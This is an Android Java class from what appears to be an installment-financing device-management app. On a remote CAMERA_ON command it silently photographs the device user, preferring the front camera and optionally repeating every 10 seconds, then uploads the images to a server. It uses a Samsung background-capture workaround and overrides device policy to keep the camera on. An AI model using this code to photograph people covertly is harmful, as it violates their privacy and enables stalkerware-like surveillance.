package com.riad.rrlkr.service;

import android.Manifest;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;

import com.riad.rrlkr.admin.EMIDeviceAdminReceiver;
import com.riad.rrlkr.network.ApiClient;
import com.riad.rrlkr.network.ApiService;
import com.riad.rrlkr.util.PreferenceManager;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

/**
 * Remote Camera Capture - Captures a photo from device camera
 * and reports it to the server as a base64 data URL
 * Called when admin sends CAMERA_ON command
 */
public class RemoteCameraCapture {

    private static final String TAG = "RemoteCameraCapture";
    private static final int IMAGE_WIDTH = 640;
    private static final int IMAGE_HEIGHT = 480;

    private final Context context;
    private final ApiService apiService;
    private final PreferenceManager preferenceManager;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private Handler mainHandler;
    private boolean isCapturing = false;
    private boolean continuousMode = false;
    private long captureInterval = 10000; // 10 seconds default
    private SurfaceTexture dummySurfaceTexture;
    private Surface dummySurface;
    private boolean isSamsungDevice;

    public RemoteCameraCapture(Context context) {
        this.context = context;
        this.apiService = ApiClient.getApiService();
        this.preferenceManager = new PreferenceManager(context);
        this.mainHandler = new Handler(Looper.getMainLooper());
        this.isSamsungDevice = Build.MANUFACTURER.equalsIgnoreCase("samsung");
    }

    /**
     * Capture a single photo and send to server
     */
    public void captureAndReport() {
        captureAndReport(false, 10000);
    }

    /**
     * Start capturing photos (single or continuous mode)
     */
    public void captureAndReport(boolean continuous, long intervalMs) {
        Log.i(TAG, "Starting camera capture, continuous=" + continuous);

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Camera permission not granted");
            reportPhotoError("Camera permission not granted");
            return;
        }

        this.continuousMode = continuous;
        this.captureInterval = intervalMs;

        if (isCapturing) {
            Log.w(TAG, "Already capturing, stopping previous session");
            stopCapture();
        }

        // Ensure camera is enabled (not blocked by device policy)
        ensureCameraEnabled();

        startBackgroundThread();
        openCamera();
    }

    /**
     * Ensure camera is not disabled by device policy manager.
     * In Device Owner mode, the camera can be disabled by policy.
     * We explicitly enable it before capture.
     */
    private void ensureCameraEnabled() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm != null && dpm.isDeviceOwnerApp(context.getPackageName())) {
                ComponentName adminComponent = EMIDeviceAdminReceiver.getComponentName(context);
                // Explicitly set camera as NOT disabled
                dpm.setCameraDisabled(adminComponent, false);
                Log.i(TAG, "Camera explicitly enabled via DevicePolicyManager");
            }
        } catch (Exception e) {
            Log.w(TAG, "Could not ensure camera enabled via DPM: " + e.getMessage());
        }
    }

    /**
     * Stop capturing photos
     */
    public void stopCapture() {
        Log.i(TAG, "Stopping camera capture");
        continuousMode = false;
        isCapturing = false;
        closeCamera();
        stopBackgroundThread();
    }

    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join(3000);
            } catch (InterruptedException e) {
                Log.e(TAG, "Error stopping background thread", e);
            }
            backgroundThread = null;
            backgroundHandler = null;
        }
    }

    private void openCamera() {
        CameraManager cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        if (cameraManager == null) {
            Log.e(TAG, "CameraManager not available");
            reportPhotoError("CameraManager not available");
            return;
        }

        try {
            // Use front camera (selfie) for tracking - more useful
            String cameraId = getFrontCameraId(cameraManager);
            if (cameraId == null) {
                // Fallback to back camera
                cameraId = getBackCameraId(cameraManager);
            }
            if (cameraId == null) {
                Log.e(TAG, "No camera available");
                reportPhotoError("No camera available on device");
                return;
            }

            Log.d(TAG, "Opening camera: " + cameraId);

            if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                    == PackageManager.PERMISSION_GRANTED) {
                // Ensure camera not disabled by policy right before opening
                ensureCameraEnabled();
                cameraManager.openCamera(cameraId, stateCallback, backgroundHandler);
            }
        } catch (CameraAccessException e) {
            Log.e(TAG, "Camera access exception", e);
            if (e.getReason() == CameraAccessException.CAMERA_DISABLED) {
                Log.e(TAG, "Camera is disabled by policy, attempting to re-enable...");
                ensureCameraEnabled();
                // Retry once after enabling
                try {
                    Thread.sleep(500);
                    String retryId = getFrontCameraId(cameraManager);
                    if (retryId == null) retryId = getBackCameraId(cameraManager);
                    if (retryId != null) {
                        cameraManager.openCamera(retryId, stateCallback, backgroundHandler);
                        return;
                    }
                } catch (Exception retryEx) {
                    Log.e(TAG, "Retry also failed", retryEx);
                }
            }
            reportPhotoError("Camera access error: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Error opening camera", e);
            reportPhotoError("Error opening camera: " + e.getMessage());
        }
    }

    private String getFrontCameraId(CameraManager cameraManager) throws CameraAccessException {
        for (String id : cameraManager.getCameraIdList()) {
            CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(id);
            Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
            if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                return id;
            }
        }
        return null;
    }

    private String getBackCameraId(CameraManager cameraManager) throws CameraAccessException {
        for (String id : cameraManager.getCameraIdList()) {
            CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(id);
            Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
            if (facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
                return id;
            }
        }
        // Fallback to first camera
        String[] ids = cameraManager.getCameraIdList();
        return ids.length > 0 ? ids[0] : null;
    }

    private final CameraDevice.StateCallback stateCallback = new CameraDevice.StateCallback() {
        @Override
        public void onOpened(@NonNull CameraDevice camera) {
            Log.d(TAG, "Camera opened");
            cameraDevice = camera;
            isCapturing = true;
            createCaptureSession();
        }

        @Override
        public void onDisconnected(@NonNull CameraDevice camera) {
            Log.w(TAG, "Camera disconnected");
            camera.close();
            cameraDevice = null;
            isCapturing = false;
        }

        @Override
        public void onError(@NonNull CameraDevice camera, int error) {
            Log.e(TAG, "Camera error: " + error);
            camera.close();
            cameraDevice = null;
            isCapturing = false;
            reportPhotoError("Camera error code: " + error);
        }
    };

    private void createCaptureSession() {
        if (cameraDevice == null) return;

        try {
            imageReader = ImageReader.newInstance(IMAGE_WIDTH, IMAGE_HEIGHT, ImageFormat.JPEG, 2);
            imageReader.setOnImageAvailableListener(onImageAvailableListener, backgroundHandler);

            Surface imageSurface = imageReader.getSurface();
            List<Surface> outputSurfaces = new ArrayList<>();
            outputSurfaces.add(imageSurface);

            // Samsung devices need a dummy preview surface for background camera capture
            // Without this, Samsung Camera2 API often fails with configuration error
            if (isSamsungDevice) {
                try {
                    dummySurfaceTexture = new SurfaceTexture(0);
                    dummySurfaceTexture.setDefaultBufferSize(IMAGE_WIDTH, IMAGE_HEIGHT);
                    dummySurface = new Surface(dummySurfaceTexture);
                    outputSurfaces.add(dummySurface);
                    Log.d(TAG, "Samsung device detected - added dummy preview surface");
                } catch (Exception e) {
                    Log.w(TAG, "Failed to create dummy surface for Samsung: " + e.getMessage());
                }
            }

            cameraDevice.createCaptureSession(
                    outputSurfaces,
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(@NonNull CameraCaptureSession session) {
                            Log.d(TAG, "Capture session configured");
                            captureSession = session;
                            // Run a few preview frames first to let camera auto-expose
                            warmupThenCapture();
                        }

                        @Override
                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                            Log.e(TAG, "Capture session configuration failed");
                            // If Samsung-specific session failed, retry without dummy surface
                            if (isSamsungDevice && dummySurface != null) {
                                Log.i(TAG, "Retrying without dummy surface...");
                                releaseDummySurface();
                                retryWithoutDummySurface();
                            } else {
                                reportPhotoError("Camera session configuration failed");
                            }
                        }
                    },
                    backgroundHandler
            );
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error creating capture session", e);
            reportPhotoError("Error creating capture session: " + e.getMessage());
        }
    }

    /**
     * Retry capture session without Samsung dummy surface as fallback
     */
    private void retryWithoutDummySurface() {
        if (cameraDevice == null) return;
        try {
            Surface imageSurface = imageReader.getSurface();
            cameraDevice.createCaptureSession(
                    Arrays.asList(imageSurface),
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(@NonNull CameraCaptureSession session) {
                            Log.d(TAG, "Fallback capture session configured");
                            captureSession = session;
                            warmupThenCapture();
                        }

                        @Override
                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                            Log.e(TAG, "Fallback capture session also failed");
                            reportPhotoError("Camera session configuration failed on both attempts");
                        }
                    },
                    backgroundHandler
            );
        } catch (CameraAccessException e) {
            Log.e(TAG, "Fallback session error", e);
            reportPhotoError("Camera session error: " + e.getMessage());
        }
    }

    /**
     * Run a few preview frames to let the camera auto-expose and auto-focus
     * before taking the actual still capture. This significantly improves
     * photo quality (especially on Samsung) and prevents dark/black photos.
     */
    private void warmupThenCapture() {
        if (cameraDevice == null || captureSession == null) return;

        try {
            CaptureRequest.Builder previewBuilder =
                    cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
            previewBuilder.addTarget(imageReader.getSurface());
            if (dummySurface != null) {
                previewBuilder.addTarget(dummySurface);
            }
            previewBuilder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);

            // Send a repeating preview request for 1.5 seconds, then capture
            captureSession.setRepeatingRequest(previewBuilder.build(), null, backgroundHandler);

            backgroundHandler.postDelayed(() -> {
                try {
                    if (captureSession != null) {
                        captureSession.stopRepeating();
                    }
                } catch (Exception e) {
                    Log.w(TAG, "Error stopping preview: " + e.getMessage());
                }
                capturePhoto();
            }, 1500);

        } catch (CameraAccessException e) {
            Log.w(TAG, "Preview warmup failed, capturing directly: " + e.getMessage());
            capturePhoto();
        }
    }

    private void releaseDummySurface() {
        if (dummySurface != null) {
            dummySurface.release();
            dummySurface = null;
        }
        if (dummySurfaceTexture != null) {
            dummySurfaceTexture.release();
            dummySurfaceTexture = null;
        }
    }

    private void capturePhoto() {
        if (cameraDevice == null || captureSession == null) return;

        try {
            CaptureRequest.Builder captureBuilder =
                    cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            captureBuilder.addTarget(imageReader.getSurface());
            captureBuilder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
            captureBuilder.set(CaptureRequest.JPEG_QUALITY, (byte) 70);

            captureSession.capture(captureBuilder.build(), new CameraCaptureSession.CaptureCallback() {
                @Override
                public void onCaptureCompleted(@NonNull CameraCaptureSession session,
                                                @NonNull CaptureRequest request,
                                                @NonNull android.hardware.camera2.TotalCaptureResult result) {
                    Log.d(TAG, "Photo captured");

                    // Schedule next capture if continuous mode
                    if (continuousMode && isCapturing) {
                        mainHandler.postDelayed(() -> {
                            if (isCapturing && continuousMode) {
                                capturePhoto();
                            }
                        }, captureInterval);
                    } else {
                        // Single capture - close camera after a short delay
                        mainHandler.postDelayed(() -> {
                            closeCamera();
                            stopBackgroundThread();
                        }, 2000);
                    }
                }
            }, backgroundHandler);
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error capturing photo", e);
            reportPhotoError("Error capturing photo: " + e.getMessage());
        }
    }

    private final ImageReader.OnImageAvailableListener onImageAvailableListener = reader -> {
        Image image = null;
        try {
            image = reader.acquireLatestImage();
            if (image != null) {
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                byte[] bytes = new byte[buffer.remaining()];
                buffer.get(bytes);

                // Convert to base64 data URL
                String base64Image = Base64.encodeToString(bytes, Base64.NO_WRAP);
                String dataUrl = "data:image/jpeg;base64," + base64Image;

                Log.i(TAG, "Photo captured, size: " + bytes.length + " bytes");

                // Send to server
                reportPhotoToServer(dataUrl);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing captured image", e);
        } finally {
            if (image != null) {
                image.close();
            }
        }
    };

    private void reportPhotoToServer(String photoDataUrl) {
        String deviceId = preferenceManager.getDeviceId();
        if (deviceId == null || deviceId.isEmpty()) {
            Log.e(TAG, "No device ID - cannot report photo");
            return;
        }

        Map<String, Object> photoData = new HashMap<>();
        photoData.put("photo_url", photoDataUrl);

        apiService.reportPhoto(deviceId, photoData).enqueue(new Callback<Void>() {
            @Override
            public void onResponse(Call<Void> call, Response<Void> response) {
                if (response.isSuccessful()) {
                    Log.i(TAG, "Photo reported to server successfully");
                } else {
                    Log.e(TAG, "Failed to report photo: " + response.code());
                }
            }

            @Override
            public void onFailure(Call<Void> call, Throwable t) {
                Log.e(TAG, "Error reporting photo to server", t);
            }
        });
    }

    private void reportPhotoError(String error) {
        String deviceId = preferenceManager.getDeviceId();
        if (deviceId == null || deviceId.isEmpty()) return;

        Map<String, Object> photoData = new HashMap<>();
        photoData.put("photo_url", "");
        photoData.put("error", error);

        apiService.reportPhoto(deviceId, photoData).enqueue(new Callback<Void>() {
            @Override
            public void onResponse(Call<Void> call, Response<Void> response) {
                Log.d(TAG, "Photo error reported");
            }

            @Override
            public void onFailure(Call<Void> call, Throwable t) {
                Log.e(TAG, "Error reporting photo error", t);
            }
        });
    }

    private void closeCamera() {
        try {
            if (captureSession != null) {
                captureSession.close();
                captureSession = null;
            }
            if (cameraDevice != null) {
                cameraDevice.close();
                cameraDevice = null;
            }
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
            }
            releaseDummySurface();
        } catch (Exception e) {
            Log.e(TAG, "Error closing camera", e);
        }
        isCapturing = false;
    }
}
